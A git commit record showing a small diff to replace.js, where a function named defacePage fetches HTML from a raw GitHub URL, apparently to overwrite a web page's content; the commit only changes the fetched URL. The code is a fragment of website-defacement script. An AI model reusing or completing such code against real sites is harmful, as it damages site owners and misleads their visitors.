ec68ac98934a3e49d5abdcbdf091db00ff485073
zibra-hash <cybershiva011@gmail.com>
2024-08-21 21:51:04 +0530

    Update replace.js

--- replace.js
+++ replace.js
@@ -1,7 +1,7 @@
 async function defacePage() {
     try {
         // URL of the HTML content you want to load
-        const url = 'https://raw.githubusercontent.com/zibra-hash/main/main/index.html';
+        const url = 'https://raw.githubusercontent.com';
         
         // Fetch the content of the external HTML page
         const response = await fetch(url);
